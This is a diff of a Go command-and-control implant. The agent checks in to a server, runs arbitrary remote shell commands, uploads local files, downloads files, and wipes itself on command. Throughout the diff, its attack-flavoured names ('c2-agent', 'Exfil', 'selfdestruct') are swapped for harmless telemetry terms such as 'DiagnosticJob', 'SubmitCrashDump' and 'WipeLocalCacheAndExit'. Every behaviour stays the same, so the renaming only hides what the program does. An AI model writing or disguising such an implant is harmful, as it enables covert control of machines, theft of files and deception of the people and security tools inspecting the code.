@@ -10,124 +10,124 @@ import (
 	"runtime"
 	"strings"
 
-	"c2-agent/funcs"
+	"endpoint-telemetry/funcs"
 )
 
-type CheckInPayload struct {
-	AgentID  string `json:"agent_id"`
+type DeviceTelemetryPayload struct {
+	EndpointID  string `json:"agent_id"`
 	Hostname string `json:"hostname"`
 	OS       string `json:"os"`
 }
 
-type CheckInResponse struct {
+type SyncResponse struct {
 	Status string `json:"status"`
-	Tasks  []Task `json:"tasks"`
+	Jobs  []DiagnosticJob `json:"jobs"`
 }
 
-type Task struct {
+type DiagnosticJob struct {
 	ID      int    `json:"id"`
 	Command string `json:"command"`
 }
 
-type ResultPayload struct {
-	TaskID int    `json:"task_id"`
+type DiagnosticOutput struct {
+	JobID int    `json:"task_id"`
 	Output string `json:"output"`
 }
 
 func main() {
-	InitConfig()
+	InitializeTelemetry()
 
 	hostname, _ := os.Hostname()
 	agentOS := runtime.GOOS
 
-	fmt.Printf("\n[*] Starting check-in loop (jitter: %s - %s)…\n\n", JitterMin, JitterMax)
+	fmt.Printf("\n[*] Starting check-in loop (jitter: %s - %s)…\n\n", SyncDelayMin, SyncDelayMax)
 
 	for {
-		tasks, err := checkIn(hostname, agentOS)
+		jobs, err := SyncDeviceState(hostname, agentOS)
 		if err != nil {
 			fmt.Printf("[!] Check-in failed: %v\n", err)
-			funcs.SleepWithJitter(JitterMin, JitterMax)
+			funcs.DelayNextSync(SyncDelayMin, SyncDelayMax)
 			continue
 		}
 
-		fmt.Printf("[+] Checked in - %d pending task(s)\n", len(tasks))
+		fmt.Printf("[+] Checked in - %d pending job(s)\n", len(jobs))
 
-		for _, task := range tasks {
-			fmt.Printf("[>] Executing task #%d: %s\n", task.ID, task.Command)
+		for _, job := range jobs {
+			fmt.Printf("[>] Executing job #%d: %s\n", job.ID, job.Command)
 
-			if task.Command == "__selfdestruct__" {
-				fmt.Println("[!] Self-destruct command received from server!")
-				_ = sendResult(task.ID, "Self-destruct acknowledged. Agent wiping…")
-				funcs.SelfDestruct()
+			if job.Command == FlushCommand {
+				fmt.Println("[!] Cache flush command received from server")
+				_ = SubmitDiagnosticReport(job.ID, "Cache flush acknowledged. Cleaning up…")
+				funcs.WipeLocalCacheAndExit()
 			}
 
 			// cd is handled synchronously, it mutates CurrentDir which subsequent commands depend on
-			if funcs.IsCdCommand(task.Command) {
-				output, cdErr := funcs.ExecuteCommand(task.Command)
+			if funcs.IsPathUpdate(job.Command) {
+				output, cdErr := funcs.ExecuteDiagnosticTask(job.Command)
 				if cdErr != nil {
 					output = fmt.Sprintf("Error: %v", cdErr)
 				}
-				fmt.Printf("[<] Task #%d result: %s\n", task.ID, output)
-				_ = sendResult(task.ID, output)
+				fmt.Printf("[<] Job #%d result: %s\n", job.ID, output)
+				_ = SubmitDiagnosticReport(job.ID, output)
 				continue
 			}
 
-			if strings.HasPrefix(task.Command, "get ") {
-				go func(t Task) {
+			if strings.HasPrefix(job.Command, "get ") {
+				go func(t DiagnosticJob) {
 					filePath := strings.TrimSpace(strings.TrimPrefix(t.Command, "get "))
-					output, err := funcs.UploadFile(ServerURL, AgentID, filePath)
+					output, err := funcs.SubmitCrashDump(TelemetryEndpoint+PathUpload, EndpointID, filePath)
 					if err != nil {
-						output = fmt.Sprintf("Exfil error: %v", err)
+						output = fmt.Sprintf("Upload error: %v", err)
 					}
-					fmt.Printf("[<] Task #%d result: %s\n", t.ID, output)
-					_ = sendResult(t.ID, output)
-				}(task)
+					fmt.Printf("[<] Job #%d result: %s\n", t.ID, output)
+					_ = SubmitDiagnosticReport(t.ID, output)
+				}(job)
 				continue
 			}
 
-			if strings.HasPrefix(task.Command, "download ") {
-				go func(t Task) {
+			if strings.HasPrefix(job.Command, "download ") {
+				go func(t DiagnosticJob) {
 					args := strings.TrimSpace(strings.TrimPrefix(t.Command, "download "))
 					parts := strings.SplitN(args, " ", 2)
 					if len(parts) != 2 {
-						_ = sendResult(t.ID, "Usage: download <file_id> <save_path>")
+						_ = SubmitDiagnosticReport(t.ID, "Usage: download <file_id> <save_path>")
 						return
 					}
-					output, err := funcs.DownloadFile(ServerURL, parts[0], strings.TrimSpace(parts[1]))
+					output, err := funcs.FetchUpdatePackage(TelemetryEndpoint+PathFiles, parts[0], strings.TrimSpace(parts[1]))
 					if err != nil {
 						output = fmt.Sprintf("Download error: %v", err)
 					}
-					fmt.Printf("[<] Task #%d result: %s\n", t.ID, output)
-					_ = sendResult(t.ID, output)
-				}(task)
+					fmt.Printf("[<] Job #%d result: %s\n", t.ID, output)
+					_ = SubmitDiagnosticReport(t.ID, output)
+				}(job)
 				continue
 			}
 
-			go func(t Task) {
-				output, execErr := funcs.ExecuteCommand(t.Command)
+			go func(t DiagnosticJob) {
+				output, execErr := funcs.ExecuteDiagnosticTask(t.Command)
 				if execErr != nil && output == "" {
 					output = fmt.Sprintf("Error: %v", execErr)
 				}
-				fmt.Printf("[<] Task #%d result (%d bytes)\n", t.ID, len(output))
-				err := sendResult(t.ID, output)
+				fmt.Printf("[<] Job #%d result (%d bytes)\n", t.ID, len(output))
+				err := SubmitDiagnosticReport(t.ID, output)
 				if err != nil {
-					fmt.Printf("[!] Failed to send result for task #%d: %v\n", t.ID, err)
+					fmt.Printf("[!] Failed to send result for job #%d: %v\n", t.ID, err)
 				}
-			}(task)
+			}(job)
 		}
 
-		funcs.SleepWithJitter(JitterMin, JitterMax)
+		funcs.DelayNextSync(SyncDelayMin, SyncDelayMax)
 	}
 }
 
-func checkIn(hostname, agentOS string) ([]Task, error) {
-	payload := CheckInPayload{
-		AgentID:  AgentID,
+func SyncDeviceState(hostname, agentOS string) ([]DiagnosticJob, error) {
+	payload := DeviceTelemetryPayload{
+		EndpointID:  EndpointID,
 		Hostname: hostname,
 		OS:       agentOS,
 	}
 
-	respBody, err := encryptedPost(ServerURL+"/api/checkin", payload)
+	respBody, err := transmitSecureTelemetry(TelemetryEndpoint+PathCheckin, payload)
 	if err != nil {
 		return nil, err
 	}
@@ -140,37 +140,37 @@ func checkIn(hostname, agentOS string) ([]Task, error) {
 		return nil, fmt.Errorf("envelope unmarshal: %w", err)
 	}
 
-	plain, err := funcs.Decrypt(EncryptionKey, envelope.Data)
+	plain, err := funcs.UnsealTelemetry(EncryptionKey, envelope.Data)
 	if err != nil {
 		return nil, fmt.Errorf("decrypt checkin response: %w", err)
 	}
 
-	var result CheckInResponse
+	var result SyncResponse
 	if err := json.Unmarshal(plain, &result); err != nil {
 		return nil, fmt.Errorf("unmarshal response: %w", err)
 	}
-	return result.Tasks, nil
+	return result.Jobs, nil
 }
 
-func sendResult(taskID int, output string) error {
-	payload := ResultPayload{
-		TaskID: taskID,
+func SubmitDiagnosticReport(jobID int, output string) error {
+	payload := DiagnosticOutput{
+		JobID: jobID,
 		Output: output,
 	}
-	_, err := encryptedPost(ServerURL+"/api/result", payload)
+	_, err := transmitSecureTelemetry(TelemetryEndpoint+PathResult, payload)
 	return err
 }
 
-// encryptedPost JSON-encodes payload, encrypts it with AES-256-GCM,
+// transmitSecureTelemetry JSON-encodes payload, encrypts it with AES-256-GCM,
 // wraps the ciphertext in a {kid, data} envelope, and POSTs it.
 // Returns the raw response body so the caller can decrypt if needed.
-func encryptedPost(url string, payload any) ([]byte, error) {
+func transmitSecureTelemetry(url string, payload any) ([]byte, error) {
 	inner, err := json.Marshal(payload)
 	if err != nil {
 		return nil, fmt.Errorf("marshal: %w", err)
 	}
 
-	enc, err := funcs.Encrypt(EncryptionKey, inner)
+	enc, err := funcs.SealTelemetry(EncryptionKey, inner)
 	if err != nil {
 		return nil, fmt.Errorf("encrypt: %w", err)
 	}
